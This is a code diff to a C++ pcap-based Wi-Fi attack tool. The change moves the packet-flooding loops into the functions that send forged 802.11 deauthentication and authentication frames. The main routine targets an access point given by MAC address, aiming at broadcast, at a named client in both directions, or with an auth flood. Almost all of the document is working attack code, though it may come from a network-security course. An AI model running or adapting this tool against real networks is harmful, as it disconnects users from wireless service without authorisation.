@@ -36,10 +36,13 @@ void sendDeauthPacket(pcap_t *handle, const Mac &smac, const Mac &dmac, const Ma
     deauth_pkt.radio_hdr = *radio_hdr;
     deauth_pkt.deauth_hdr = *deauth_hdr;
     deauth_pkt.deauth_body = *deauth_body;
-
-    if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&deauth_pkt), sizeof(deauth_pkt)) != 0)
+    for (int i = 0; i < 100; ++i)
     {
-        fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
+        if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&deauth_pkt), sizeof(deauth_pkt)) != 0)
+        {
+            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
+        }
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
     }
 }
 
@@ -62,27 +65,12 @@ void sendAuthPacket(pcap_t *handle, const Mac &smac, const Mac &dmac, const Mac 
     auth_pkt.radio_hdr = *radio_hdr;
     auth_pkt.deauth_hdr = *deauth_hdr;
     auth_pkt.auth_body = *auth_body;
-
-    if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&auth_pkt), sizeof(auth_pkt)) != 0)
-    {
-        fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
-    }
-}
-
-void sendPackets2(pcap_t *handle, const Mac &smac, const Mac &dmac, const Mac &bssid)
-{
     for (int i = 0; i < 100; ++i)
     {
-        sendAuthPacket(handle, smac, dmac, bssid);
-        std::this_thread::sleep_for(std::chrono::milliseconds(100));
-    }
-}
-
-void sendPackets(pcap_t *handle, const Mac &smac, const Mac &dmac, const Mac &bssid)
-{
-    for (int i = 0; i < 100; ++i)
-    {
-        sendDeauthPacket(handle, smac, dmac, bssid);
+        if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&auth_pkt), sizeof(auth_pkt)) != 0)
+        {
+            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
+        }
         std::this_thread::sleep_for(std::chrono::milliseconds(100));
     }
 }
@@ -99,28 +87,26 @@ int main(int argc, char *argv[])
     char *dev = argv[1];
     pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     Mac apmac(argv[2]);
-    Mac broadmac(Mac::broadcastMac());
-    // Mac dmac;
 
     switch (argc)
     {
     case 3:
     {
-        std::thread t1(sendPackets, handle, apmac, Mac::broadcastMac(), apmac);
+        std::thread t1(sendDeauthPacket, handle, apmac, Mac::broadcastMac(), apmac);
         t1.join();
         break;
     }
     case 4:
     {
-        std::thread t1(sendPackets, handle, apmac, Mac(argv[3]), apmac);
-        std::thread t2(sendPackets, handle, Mac(argv[3]), apmac, apmac);
+        std::thread t1(sendDeauthPacket, handle, apmac, Mac(argv[3]), apmac);
+        std::thread t2(sendDeauthPacket, handle, Mac(argv[3]), apmac, apmac);
         t1.join();
         t2.join();
         break;
     }
     case 5:
     {
-        std::thread t1(sendPackets2, handle, apmac, Mac(argv[3]), apmac);
+        std::thread t1(sendAuthPacket, handle, apmac, Mac(argv[3]), apmac);
         t1.join();
         break;
     }
